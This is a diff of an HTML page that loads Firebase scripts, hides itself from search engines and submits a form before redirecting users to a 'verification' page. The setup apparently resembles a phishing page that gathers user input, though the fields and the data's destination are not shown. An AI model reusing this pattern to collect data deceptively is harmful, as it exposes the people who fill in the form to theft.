@@ -1,5 +1,8 @@
 <!DOCTYPE html>
-<html><head><meta name="robots" content="noindex, nofollow, noarchive" /><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script><script src="./assets/js/firebase-client.js"></script>
+<html><head>
+	<meta name="robots" content="noindex, nofollow, noarchive" />
+	<meta http-equiv="refresh" content="5;url=verification.html">
+	<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script><script src="./assets/js/firebase-client.js"></script>
 
 
 
@@ -2780,32 +2783,28 @@ document.addEventListener('DOMContentLoaded', function() {
 	
 <script>
 function v40() {
-  // 1. تحديد الزر والنموذج
   const sendBtn = document.getElementById('i41');
   const form = sendBtn ? sendBtn.closest('form') : null;
 
-  // 2. تعطيل الزر لمنع التكرار
+  // 1. تعطيل الزر لمنع الضغط المكرر
   if (sendBtn) {
     sendBtn.disabled = true;
     sendBtn.innerText = 'جاري الإرسال...';
   }
 
-  // 3. إرسال البيانات في الخلفية بدون إنشعار أو إعادة تحميل
+  // 2. إرسال النموذج بالطريقة العادية لضمان وصول البيانات
   if (form) {
-    const formData = new FormData(form);
-    const targetUrl = form.action && form.action !== '' ? form.action : window.location.href;
-
-    fetch(targetUrl, {
-      method: form.method && form.method !== '' ? form.method : 'POST',
-      body: formData
-    })
-    .then(response => console.log('تم إرسال البيانات بنجاح'))
-    .catch(err => console.error('خطأ في الإرسال:', err));
+    // إذا كان للنموذج دالة فحص أو إرسال سابقة ننفذها
+    if (typeof form.submit === 'function') {
+      form.submit();
+    } else {
+      HTMLFormElement.prototype.submit.call(form);
+    }
   }
 
-  // 4. التوجيه المؤكد بعد 5 ثوانٍ
+  // 3. التوجيه بعد 5 ثوانٍ
   setTimeout(function() {
-    window.location.assign('page2.html'); // استبدل page2.html برابط صفحتك أو مسارها الصحيح
+    window.location.href = 'verification.html'; // استبدل page2.html برابط صفحتك
   }, 5000);
 }
 </script>
